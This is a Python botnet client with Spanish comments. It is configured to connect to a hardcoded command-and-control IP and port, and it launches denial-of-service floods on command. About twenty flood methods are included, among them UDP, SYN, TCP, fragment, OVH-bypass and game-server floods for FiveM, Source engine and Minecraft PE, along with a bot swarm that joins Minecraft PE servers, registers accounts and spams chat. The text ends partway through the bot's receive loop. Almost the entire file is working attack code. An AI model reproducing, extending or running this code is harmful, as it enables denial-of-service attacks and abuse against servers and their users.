import subprocess, random, os, time, threading, socket, sys, struct, zlib, json, base64, math, string, signal, hashlib
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend

# ─── Configuración ─────────────────────────────────────────────────────────────
C2_ADDRESS  = "45.13.236.245"  # CAMBIA ESTO POR TU IP
C2_PORT     = 26110            # CAMBIA ESTO POR TU PUERTO
RECONNECT_DELAY = 5

# ─── Ataques ──────────────────────────────────────────────────────────────────
user_attacks = {}
mcbot_bots = []
mcbot_lock = threading.Lock()
mcbot_should_stop = False

payload_fivem = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
payload_vse = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
payload_mcpe = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
payload_hex = b'\x55\x55\x55\x55\x00\x00\x00\x01'
payload_stdhex = b'\x00' * 1024

PACKET_SIZES = [1024, 2048]

def get_architecture():
    try:
        result = subprocess.check_output(['uname', '-m'], stderr=subprocess.DEVNULL)
        return result.decode().strip()
    except:
        return 'unknown'

def generate_end(length=4, chara='\n\r'):
    return ''.join(random.choice(chara) for _ in range(length))

# ─── UDP PPS ──────────────────────────────────────────────────────────────────
def attack_udp_pps(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        packet = b'\x00' * 64
        while time.time() < secs:
            if stop_event.is_set():
                break
            for _ in range(50):
                try:
                    sock.sendto(packet, (ip, port))
                except:
                    pass
    except:
        pass

# ─── UDP Bypass ──────────────────────────────────────────────────────────────
def attack_udp_bypass(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet = random._urandom(random.choice(PACKET_SIZES))
            try:
                sock.sendto(packet, (ip, port))
            except:
                pass
    except:
        pass

def attack_udp_bypass_v2(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet = random._urandom(random.choice([512, 1024, 2048]))
            for _ in range(5):
                try:
                    sock.sendto(packet, (ip, port))
                except:
                    pass
    except:
        pass

# ─── UDP Fragment ────────────────────────────────────────────────────────────
def attack_udp_frag(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet = random._urandom(65000)
            try:
                sock.sendto(packet[:random.randint(1000, 65000)], (ip, port))
            except:
                pass
    except:
        pass

# ─── UDP Game ────────────────────────────────────────────────────────────────
def attack_udp_game(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet = random._urandom(random.choice([512, 780, 1024, 1032]))
            try:
                sock.sendto(packet, (ip, port))
            except:
                pass
    except:
        pass

# ─── UDP Query ───────────────────────────────────────────────────────────────
def attack_udp_query(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        query = b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(query, (ip, port))
            except:
                pass
    except:
        pass

# ─── RakNet ──────────────────────────────────────────────────────────────────
def attack_raknet(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        rak_packet = b'\x01' + b'\x00' * 23 + b'\x00\x00'
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(rak_packet, (ip, port))
            except:
                pass
    except:
        pass

# ─── TCP ─────────────────────────────────────────────────────────────────────
def attack_tcp(ip, port, secs, stop_event):
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            packet = random._urandom(1024)
            start = time.time()
            while time.time() - start < 2 and not stop_event.is_set():
                try:
                    s.send(packet)
                except:
                    break
            s.close()
        except:
            pass

# ─── TCP OVH ─────────────────────────────────────────────────────────────────
def attack_tcp_ovh(ip, port, secs, stop_event):
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            packet = random._urandom(65000)
            for _ in range(10):
                try:
                    s.send(packet[:1400])
                except:
                    break
            s.close()
        except:
            pass

# ─── OVH UDP ─────────────────────────────────────────────────────────────────
def attack_ovh_udp(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        packet = random._urandom(65000)
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(packet, (ip, port))
            except:
                pass
    except:
        pass

# ─── HEX ─────────────────────────────────────────────────────────────────────
def attack_hex(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(payload_hex, (ip, port))
            except:
                pass
    except:
        pass

def attack_stdhex(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(payload_stdhex, (ip, port))
            except:
                pass
    except:
        pass

# ─── SYN ─────────────────────────────────────────────────────────────────────
def attack_syn(ip, port, secs, stop_event):
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))
            s.send(os.urandom(1024))
            s.close()
        except:
            pass

# ─── MIX ─────────────────────────────────────────────────────────────────────
def attack_mix(ip, port, secs, stop_event):
    while time.time() < secs:
        if stop_event.is_set():
            break
        try:
            if random.choice([True, False]):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, port))
                s.send(random._urandom(1024))
                s.close()
            else:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(1024), (ip, port))
        except:
            pass

# ─── MCPE ────────────────────────────────────────────────────────────────────
def attack_mcpe(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(payload_mcpe, (ip, port))
            except:
                pass
    except:
        pass

# ─── FIVEM ──────────────────────────────────────────────────────────────────
def attack_fivem(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(payload_fivem, (ip, port))
            except:
                pass
    except:
        pass

# ─── VSE ────────────────────────────────────────────────────────────────────
def attack_vse(ip, port, secs, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while time.time() < secs:
            if stop_event.is_set():
                break
            try:
                sock.sendto(payload_vse, (ip, port))
            except:
                pass
    except:
        pass

def lunch_attack(method, ip, port, secs, stop_event):
    methods = {
        '.HEX': attack_hex,
        '.STDHEX': attack_stdhex,
        '.UDP': attack_udp_bypass,
        '.UDPFRAG': attack_udp_frag,
        '.UDPGAME': attack_udp_game,
        '.UDPPPS': attack_udp_pps,
        '.UDPQUERY': attack_udp_query,
        '.UDPBYPASS': attack_udp_bypass,
        '.UDPBYPASSV2': attack_udp_bypass_v2,
        '.TCP': attack_tcp,
        '.TCPOVH': attack_tcp_ovh,
        '.MIX': attack_mix,
        '.SYN': attack_syn,
        '.VSE': attack_vse,
        '.MCPE': attack_mcpe,
        '.FIVEM': attack_fivem,
        '.RAKNET': attack_raknet,
        '.OVHUDP': attack_ovh_udp,
        '.OVHTCP': attack_tcp_ovh,
    }
    if method in methods:
        methods[method](ip, port, secs, stop_event)

def start_attack(method, ip, port, duration, thread_count, username):
    stop_event = threading.Event()
    end_time = time.time() + duration

    for _ in range(thread_count):
        t = threading.Thread(target=lunch_attack, args=(method, ip, port, end_time, stop_event), daemon=True)
        t.start()

        if username not in user_attacks:
            user_attacks[username] = []
        user_attacks[username].append((t, stop_event))

def stop_attacks(username):
    if username in user_attacks:
        for t, stop_event in user_attacks[username]:
            stop_event.set()
        user_attacks[username].clear()

# ─── MCBOT COMPLETO ─────────────────────────────────────────────────────────────
CHARS = string.ascii_lowercase + string.digits
MAGIC = bytes([0x00,0xFF,0xFF,0x00,0xFE,0xFE,0xFE,0xFE,0xFD,0xFD,0xFD,0xFD,0x12,0x34,0x56,0x78])
MTU_LIST = [1492, 1464, 1400, 1200, 576]

try:
    EC_KEY = ec.generate_private_key(ec.SECP384R1(), default_backend())
except Exception:
    EC_KEY = None

def pub_key_b64():
    if EC_KEY is None: return 'AAAA'
    return base64.b64encode(EC_KEY.public_key().public_bytes(
        serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
    )).decode('utf-8')

def b64url(data):
    if isinstance(data, (dict, list)):
        data = json.dumps(data, separators=(',', ':')).encode('utf-8')
    elif isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def der_sig_to_raw(der):
    o = 2
    rl = der[o+1]; o += 2; rr = der[o:o+rl]; o += rl
    sl = der[o+1]; o += 2; sr = der[o:o+sl]
    ra = bytearray(48); sa = bytearray(48)
    rt = rr[1:] if rr[0]==0 else rr
    st = sr[1:] if sr[0]==0 else sr
    ra[48-len(rt):] = rt; sa[48-len(st):] = st
    return bytes(ra) + bytes(sa)

def make_jwt(payload):
    pub = pub_key_b64()
    data = b64url({'alg':'ES384','x5u':pub}) + '.' + b64url(payload)
    if EC_KEY is None: return data + '.'
    try:
        der = EC_KEY.sign(data.encode('utf-8'), ec.ECDSA(hashes.SHA384()))
        return data + '.' + base64.urlsafe_b64encode(der_sig_to_raw(der)).rstrip(b'=').decode('utf-8')
    except Exception:
        return data + '.'

class W:
    def __init__(self): self.parts = []
    def u8(self, v): self.parts.append(struct.pack('B', v & 0xFF)); return self
    def u16be(self, v): self.parts.append(struct.pack('>H', v & 0xFFFF)); return self
    def i32be(self, v): self.parts.append(struct.pack('>i', v)); return self
    def u32be(self, v): self.parts.append(struct.pack('>I', v & 0xFFFFFFFF)); return self
    def i32le(self, v): self.parts.append(struct.pack('<i', v)); return self
    def i64be(self, v): self.parts.append(struct.pack('>q', v)); return self
    def u64be(self, v): self.parts.append(struct.pack('>Q', v & 0xFFFFFFFFFFFFFFFF)); return self
    def f32be(self, v): self.parts.append(struct.pack('>f', v)); return self
    def t_le(self, v): self.parts.append(bytes([v & 0xFF, (v >> 8) & 0xFF, (v >> 16) & 0xFF])); return self
    def raw(self, b): self.parts.append(bytes(b)); return self
    def magic(self): self.parts.append(MAGIC); return self
    def str_(self, s):
        b = s.encode('utf-8'); self.u16be(len(b)); self.parts.append(b); return self
    def str_raw(self, b):
        b = bytes(b); self.u16be(len(b)); self.parts.append(b); return self
    def rak_ip(self, ip, port):
        self.u8(4)
        for o in ip.split('.'): self.u8((~int(o)) & 0xFF)
        self.u16be(port); return self
    def buf(self): return b''.join(self.parts)

class R:
    def __init__(self, b): self.b = bytes(b); self.p = 0
    def left(self): return len(self.b) - self.p
    def u8(self): v = self.b[self.p]; self.p += 1; return v
    def u16be(self): v = struct.unpack_from('>H', self.b, self.p)[0]; self.p += 2; return v
    def i32be(self): v = struct.unpack_from('>i', self.b, self.p)[0]; self.p += 4; return v
    def u32be(self): v = struct.unpack_from('>I', self.b, self.p)[0]; self.p += 4; return v
    def i64be(self): v = struct.unpack_from('>q', self.b, self.p)[0]; self.p += 8; return v
    def u64be(self): v = struct.unpack_from('>Q', self.b, self.p)[0]; self.p += 8; return v
    def f32be(self): v = struct.unpack_from('>f', self.b, self.p)[0]; self.p += 4; return v
    def t_le(self): v = self.b[self.p]|(self.b[self.p+1]<<8)|(self.b[self.p+2]<<16); self.p+=3; return v
    def bytes_(self, n): v = self.b[self.p:self.p+n]; self.p += n; return v
    def skip(self, n): self.p += n; return self
    def str_(self): n = self.u16be(); return self.bytes_(n).decode('utf-8', errors='replace')

# ─── Funciones MCBot ──────────────────────────────────────────────────────────
def generar_nombre(base):
    return f"{base}_{''.join(random.choices(CHARS, k=6))}"

def random_pass():
    return ''.join(random.choices(CHARS, k=8))

def generate_steve_skin():
    buf = bytearray(64 * 32 * 4)
    def fill(x0, y0, x1, y1, r, g, b, a=255):
        for y in range(y0, y1):
            for x in range(x0, x1):
                i = (y * 64 + x) * 4
                buf[i] = r; buf[i+1] = g; buf[i+2] = b; buf[i+3] = a
    def px(x, y, r, g, b):
        i = (y * 64 + x) * 4
        buf[i] = r; buf[i+1] = g; buf[i+2] = b; buf[i+3] = 255
    SK = (198, 134, 66); HR = (92, 56, 35); SH = (67, 95, 175)
    PT = (53, 85, 105); BT = (38, 38, 38)
    fill(8, 0, 16, 8, *HR); fill(16, 0, 24, 8, *SK)
    fill(0, 8, 8, 16, *SK); fill(8, 8, 16, 16, *SK)
    fill(16, 8, 24, 16, *HR); fill(24, 8, 32, 16, *HR)
    fill(8, 0, 16, 4, *HR)
    fill(9, 9, 11, 11, 255, 255, 255); px(9, 10, 33, 18, 7)
    fill(13, 9, 15, 11, 255, 255, 255); px(14, 10, 33, 18, 7)
    px(11, 11, *SK); px(12, 11, *SK)
    px(11, 12, 140, 80, 30); px(12, 12, 140, 80, 30)
    fill(10, 13, 14, 14, 140, 60, 20)
    fill(20, 16, 28, 20, *SH); fill(28, 16, 36, 20, *SH)
    fill(16, 20, 20, 32, *SH); fill(20, 20, 28, 32, *SH)
    fill(28, 20, 32, 32, *SH); fill(32, 20, 40, 32, *SH)
    fill(23, 20, 25, 32, 50, 75, 155)
    fill(44, 16, 48, 20, *SK); fill(48, 16, 52, 20, *SK)
    fill(40, 20, 44, 32, *SK); fill(44, 20, 48, 32, *SK)
    fill(48, 20, 52, 32, *SK); fill(52, 20, 56, 32, *SK)
    fill(44, 20, 48, 24, *SH); fill(40, 20, 44, 24, *SH)
    fill(48, 20, 52, 24, *SH); fill(52, 20, 56, 24, *SH)
    fill(4, 16, 8, 20, *PT); fill(8, 16, 12, 20, *PT)
    fill(0, 20, 4, 32, *PT); fill(4, 20, 8, 32, *PT)
    fill(8, 20, 12, 32, *PT); fill(12, 20, 16, 32, *PT)
    fill(0, 28, 4, 32, *BT); fill(4, 28, 8, 32, *BT)
    fill(8, 28, 12, 32, *BT); fill(12, 28, 16, 32, *BT)
    return base64.b64encode(bytes(buf)).decode('utf-8')

STEVE_SKIN = generate_steve_skin()

def build_login84(bot):
    pub = pub_key_b64()
    uuid_str = '00000000-0000-4000-8000-' + os.urandom(6).hex()
    now = int(time.time())
    chain = make_jwt({
        'extraData': {'displayName': bot['nombre'], 'identity': uuid_str, 'XUID': ''},
        'identityPublicKey': pub,
        'nbf': now - 60,
        'exp': now + 86400
    })
    skin = make_jwt({
        'ClientRandomId': bot['client_id'] & 0xFFFFFFFF,
        'ServerAddress': f"{bot['host']}:{bot['port']}",
        'SkinData': STEVE_SKIN,
        'SkinId': 'Standard_Custom',
        'CapeData': '',
        'SkinGeometryName': 'geometry.humanoid.custom',
        'SkinGeometry': '',
        'DeviceOS': 1,
        'GameVersion': '0.15.10'
    })
    cb = json.dumps({'chain': [chain]}).encode('utf-8')
    sb = skin.encode('utf-8')
    raw = W().i32le(len(cb)).raw(cb).i32le(len(sb)).raw(sb).buf()
    comp = zlib.compress(raw, level=7)
    return bytes([0xfe,0x01]) + W().i32be(84).i32be(len(comp)).raw(comp).buf()

def build_login70(bot):
    skin_buf = base64.b64decode(STEVE_SKIN)
    return (W().u8(0x8f).str_(bot['nombre']).i32be(70).i32be(70)
               .u64be(bot['client_id']).raw(os.urandom(16))
               .str_(f"{bot['host']}:{bot['port']}").str_('').str_('Standard_Custom')
               .str_raw(skin_buf).u8(0).buf())

def build_batch(pkts, bot):
    inner = b''.join(struct.pack('>I', len(p)) + p for p in pkts)
    comp = zlib.compress(inner, level=7)
    if bot['proto'] >= 84:
        return bytes([0xfe,0x06]) + W().i32be(len(comp)).raw(comp).buf()
    return W().u8(0x92).i32be(len(comp)).raw(comp).buf()

FRAME_STORE_MAX = 1024

def _udp_send(bot, buf):
    if bot['sock'] is None: return
    try: bot['sock'].sendto(buf, (bot['host'], bot['port']))
    except: pass

def _rak_frame(bot, payload, is_split, split_count, split_id, split_idx):
    if bot['sock'] is None or bot['is_closing'] or mcbot_should_stop:
        return
    seq = bot['send_seq']; bot['send_seq'] += 1
    w = W().u8(0x84).t_le(seq)
    w.u8(0x70 if is_split else 0x60)
    w.u16be(len(payload) * 8)
    mi = bot['msg_index']; bot['msg_index'] += 1
    oi = bot['order_index']; bot['order_index'] += 1
    w.t_le(mi).t_le(oi).u8(0)
    if is_split: w.u32be(split_count).u16be(split_id).u32be(split_idx)
    w.raw(payload)
    buf = w.buf()
    bot['sent_frames'][seq] = buf
    if len(bot['sent_frames']) > FRAME_STORE_MAX:
        del bot['sent_frames'][next(iter(bot['sent_frames']))]
    _udp_send(bot, buf)

def send_reliable_ordered(bot, payload):
    if bot['sock'] is None or bot['is_closing'] or mcbot_should_stop:
        return
    MAX = (bot['mtu_size'] or 1464) - 60
    if len(payload) <= MAX:
        _rak_frame(bot, payload, False, 0, 0, 0); return
    sid = bot['split_id'] & 0xFFFF; bot['split_id'] += 1
    cnt = math.ceil(len(payload) / MAX)
    for i in range(cnt):
        _rak_frame(bot, payload[i*MAX:(i+1)*MAX], True, cnt, sid, i)

def send_game(bot, pkt):
    if bot['sock'] is None or bot['is_closing'] or mcbot_should_stop:
        return
    send_reliable_ordered(bot, build_batch([pkt], bot))

def get_ids(bot):
    if bot['proto'] < 84:
        return {'move':0x9d, 'text':0x93, 'chunk':0xc9}
    if bot['use_variant_a']:
        return {'move':0x10, 'text':0x07, 'chunk':0x3d}
    return {'move':0x13, 'text':0x09, 'chunk':0x45}

def build_chunk_radius(bot):
    return W().u8(get_ids(bot)['chunk']).i32be(8).buf()

def build_move_player(bot):
    p = bot['pos']
    return (W().u8(get_ids(bot)['move']).i64be(bot['entity_id'])
               .f32be(p['x']).f32be(p['y']).f32be(p['z'])
               .f32be(p['yaw']).f32be(p['yaw']).f32be(p['pitch'])
               .u8(0).u8(1).buf())

def build_chat(bot, msg):
    return W().u8(get_ids(bot)['text']).u8(1).str_(bot['nombre']).str_(msg).buf()

def build_rspack_resp(bot, status):
    rid = 0x08 if bot['use_variant_a'] else 0x08
    return W().u8(rid).u8(status).u16be(0).buf()

def handle_play_status(bot, status):
    if status == 3 and not bot['spawned']:
        bot['spawned'] = True
        send_game(bot, build_chunk_radius(bot))
        send_register(bot)
        start_mcbot_move(bot)
        start_mcbot_spam(bot)

def send_register(bot):
    if bot['register_sent'] or not bot['register_cmd']:
        return
    bot['register_sent'] = True
    if bot['register_cmd'].startswith('/'):
        msg = f"{bot['register_cmd']} {random_pass()}"
    else:
        msg = bot['register_cmd']
    send_game(bot, build_chat(bot, msg))

def start_mcbot_spam(bot):
    def spam_loop():
        idx = 0
        while not bot['is_closing'] and not mcbot_should_stop and bot['spawned']:
            if bot['mensajes']:
                msg = bot['mensajes'][idx % len(bot['mensajes'])]
                send_game(bot, build_chat(bot, msg))
                idx += 1
            time.sleep(bot['intervalo'])
    threading.Thread(target=spam_loop, daemon=True).start()

def start_mcbot_move(bot):
    def move_loop():
        ox, oy, oz = bot['pos']['x'], bot['pos']['y'], bot['pos']['z']
        while not bot['is_closing'] and not mcbot_should_stop and bot['spawned']:
            bot['pos']['x'] = ox + random.uniform(-5, 5)
            bot['pos']['z'] = oz + random.uniform(-5, 5)
            bot['pos']['y'] = oy + random.uniform(-0.5, 0.5)
            bot['pos']['yaw'] = random.uniform(0, 360)
            send_game(bot, build_move_player(bot))
            time.sleep(0.5)
    threading.Thread(target=move_loop, daemon=True).start()

def mcpe_handler(bot, data):
    if not data or bot['is_closing']: return
    pid = data[0]
    r = R(data); r.skip(1)

    if pid == 0x90 or pid == 0x02:
        st = r.i32be()
        if st == 0:
            send_game(bot, build_chunk_radius(bot))
        elif st in (1, 2):
            cerrar_bot(bot)
        elif st == 3:
            handle_play_status(bot, st)
        return

    if pid == 0x06 and bot['proto'] >= 84 and not bot['resource_pack_done'] and not bot['use_variant_a']:
        send_game(bot, build_rspack_resp(bot, 3)); return

    if pid == 0x07 and bot['proto'] >= 84 and not bot['resource_pack_done'] and not bot['use_variant_a']:
        bot['resource_pack_done'] = True
        send_game(bot, build_rspack_resp(bot, 4)); return

    if pid == 0x03 and bot['proto'] >= 84:
        send_game(bot, W().u8(0x04).buf())
        send_game(bot, build_chunk_radius(bot)); return

    if pid in (0x95, 0x09, 0x0b, 0x11):
        if bot['proto'] >= 84:
            bot['use_variant_a'] = (pid == 0x09)
        try:
            r.i32be(); r.u8(); r.i32be(); r.i32be()
            bot['entity_id'] = r.i64be()
            r.i32be(); r.i32be(); r.i32be()
            bot['pos']['x'] = r.f32be()
            bot['pos']['y'] = r.f32be()
            bot['pos']['z'] = r.f32be()
        except:
            pass
        send_game(bot, build_chunk_radius(bot))
        if bot['spawn_fallback'] is None:
            def fallback():
                if not bot['spawned'] and not bot['is_closing'] and not mcbot_should_stop:
                    handle_play_status(bot, 3)
            t = threading.Timer(10.0, fallback); t.daemon=True; t.start()
            bot['spawn_fallback'] = t
        return

    if pid in (0x91, 0x05):
        cerrar_bot(bot); return

def handle_batch(bot, payload):
    if bot['is_closing']: return
    try:
        r = R(payload); cl = r.i32be(); comp = r.bytes_(min(cl, r.left()))
        try: inner = zlib.decompress(comp)
        except: inner = zlib.decompress(comp, -15)
        ir = R(inner)
        while ir.left() >= 4:
            ln = ir.u32be()
            if ln == 0 or ln > ir.left(): break
            pkt = ir.bytes_(ln)
            if pkt[0] == 0xfe and len(pkt) > 1:
                mcpe_handler(bot, pkt[1:])
            else:
                mcpe_handler(bot, pkt)
    except: pass

def inner_packet(bot, payload):
    if not payload or bot['is_closing']: return
    pid = payload[0]
    if pid == 0x00:
        if len(payload) >= 9:
            t = struct.unpack_from('>q', payload, 1)[0]
            _rak_frame(bot, W().u8(0x03).i64be(t).i64be(int(time.time()*1000)).buf(), False,0,0,0)
        return
    if pid == 0x15: cerrar_bot(bot); return
    if pid == 0x10: handle_server_handshake(bot, payload); return
    if pid == 0xfe:
        if len(payload) < 2: return
        if payload[1] == 0x06:
            handle_batch(bot, payload[2:])
        else:
            mcpe_handler(bot, payload[1:])
        return
    if pid == 0x92:
        handle_batch(bot, payload[1:]); return
    if pid == 0x06 and bot['proto'] >= 84:
        handle_batch(bot, payload[1:]); return
    mcpe_handler(bot, payload)

def parse_data_pkt(bot, msg):
    if bot['is_closing']: return
    r = R(msg); r.skip(1); seq = r.t_le()
    bot['ack_queue'].append(seq)
    while r.left() > 0:
        try:
            flags = r.u8(); rel = (flags>>5)&7; is_split = (flags>>4)&1
            bits = r.u16be(); blen = math.ceil(bits/8)
            if rel in (2,3,4,6,7): r.t_le()
            if rel in (1,3,4): r.t_le(); r.u8()
            sc=si=sx=0
            if is_split: sc=r.u32be(); si=r.u16be(); sx=r.u32be()
            payload = r.bytes_(blen)
            if is_split:
                if si not in bot['split_map']: bot['split_map'][si]=[None]*sc
                bot['split_map'][si][sx] = payload
                if all(x is not None for x in bot['split_map'][si]):
                    inner_packet(bot, b''.join(bot['split_map'][si]))
                    del bot['split_map'][si]
            else:
                inner_packet(bot, payload)
        except: break

def handle_server_handshake(bot, payload):
    if bot['is_closing']: return
    r = R(payload); r.skip(1); ping_time = 0
    try:
        v = r.u8(); r.skip(6 if v==4 else 18); r.skip(2)
        for _ in range(10): x = r.u8(); r.skip(6 if x==4 else 18)
        ping_time = r.i64be()
    except: pass
    hw = W().u8(0x13).rak_ip(bot['host'], bot['port'])
    for _ in range(10): hw.u8(4).u8(0x80).u8(0xFF).u8(0xFF).u8(0xFE).u16be(0)
    hw.i64be(ping_time).i64be(int(time.time()*1000))
    _rak_frame(bot, hw.buf(), False,0,0,0)
    if bot['phase'] == 'HANDSHAKING':
        bot['phase'] = 'LOGIN'
        def do_login():
            if mcbot_should_stop or bot['is_closing']: return
            send_reliable_ordered(bot, build_login84(bot) if bot['proto']>=84 else build_login70(bot))
        threading.Timer(0.1, do_login).start()

def send_request1(bot):
    if bot['sock'] is None or bot['is_closing'] or mcbot_should_stop: return
    mtu = MTU_LIST[bot['mtu_idx'] % len(MTU_LIST)]; bot['mtu_size'] = mtu
    padding = max(0, mtu - 28 - 1 - 16 - 1)
    _udp_send(bot, W().u8(0x05).magic().u8(7).raw(bytes(padding)).buf())

def cerrar_bot(bot):
    if bot['is_closing']: return
    bot['is_closing'] = True
    bot['spawned'] = False
    for attr in ('spawn_fallback','mtu_retry_t','req2_retry_t'):
        t = bot.get(attr)
        if t: t.cancel(); bot[attr] = None
    sock = bot['sock']; bot['sock'] = None
    if sock:
        try: sock.close()
        except: pass

def schedule_mtu_retry(bot):
    if bot['mtu_retry_t']: bot['mtu_retry_t'].cancel()
    def retry():
        if bot['phase'] != 'CONNECTING_1' or bot['is_closing'] or mcbot_should_stop: return
        bot['mtu_idx'] = (bot['mtu_idx']+1) % len(MTU_LIST)
        send_request1(bot); schedule_mtu_retry(bot)
    t = threading.Timer(3.0, retry); t.daemon=True; t.start(); bot['mtu_retry_t'] = t

def iniciar_mcbot(host, port, nombre, register_cmd, mensajes, intervalo):
    bot = {
        'host': host, 'port': port,
        'nombre': generar_nombre(nombre),
        'register_cmd': register_cmd,
        'mensajes': mensajes,
        'intervalo': intervalo,
        'client_id': int.from_bytes(os.urandom(8), 'big'),
        'mtu_size': MTU_LIST[0],
        'send_seq': 0, 'msg_index': 0, 'order_index': 0, 'split_id': 0,
        'entity_id': 0,
        'pos': {'x': 0, 'y': 64, 'z': 0, 'yaw': 0, 'pitch': 0},
        'spawned': False, 'is_closing': False, 'sock': None,
        'register_sent': False,
        'phase': 'UNCONNECTED', 'mtu_idx': 0,
        'proto': 70, 'use_variant_a': False, 'resource_pack_done': False,
        'ack_queue': [], 'split_map': {}, 'sent_frames': {},
        'spawn_fallback': None, 'mtu_retry_t': None, 'req2_retry_t': None,
    }

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setblocking(False)
    sock.bind(('', 0))
    bot['sock'] = sock

    _udp_send(bot, W().u8(0x01).i64be(int(time.time()*1000)).magic().u64be(bot['client_id']).buf())

    def recv_loop():
        while not bot['is_closing'] and not mcbot_should_stop:
            try:
                msg, _ = sock.recvfrom(65535)
            except BlockingIOError:
                time.sleep(0.001); continue
            except:
                break
            if not msg: continue
            pid = msg[0]

            if pid == 0xC0: continue
            if pid == 0xA0:
                try:
                    r = R(msg); r.skip(1); cnt = r.u16be()
                    for _ in range(cnt):
                        single = r.u8(); s = r.t_le(); e = s if single else r.t_le()
                        for seq in range(s, e+1):
                            f = bot['sent_frames'].get(seq)
                            if f and bot['sock'] and not bot['is_closing']:
                                _udp_send(bot, f)
                except: pass
                continue
            if 0x80 <= pid <= 0x8F:
                parse_data_pkt(bot, msg)
                if bot['ack_queue'] and not bot['is_closing']:
                    sns = sorted(set(bot['ack_queue'])); recs = []; i = 0
                    while i < len(sns):
                        s = e = sns[i]
                        while i+1 < len(sns) and sns[i+1] == sns[i]+1:
                            i += 1; e = sns[i]
                        recs.append((s, e)); i += 1
                    w = W().u8(0xC0).u16be(len(recs))
                    for s, e in recs:
                        w.u8(1).t_le(s) if s == e else w.u8(0).t_le(s).t_le(e)
                    _udp_send(bot, w.buf())
                    bot['ack_queue'] = []
                continue

            if pid == 0x06 and bot['phase'] == 'CONNECTING_1':
                if len(msg) >= 2:
                    m = struct.unpack_from('>H', msg, len(msg)-2)[0]
                    bot['mtu_size'] = m if 576 <= m <= 1500 else 1400
                bot['phase'] = 'CONNECTING_2'
                if bot['mtu_retry_t']: bot['mtu_retry_t'].cancel(); bot['mtu_retry_t'] = None
                req2 = W().u8(0x07).magic().rak_ip(host, port).u16be(bot['mtu_size']).u64be(bot['client_id']).buf()
                _udp_send(bot, req2)
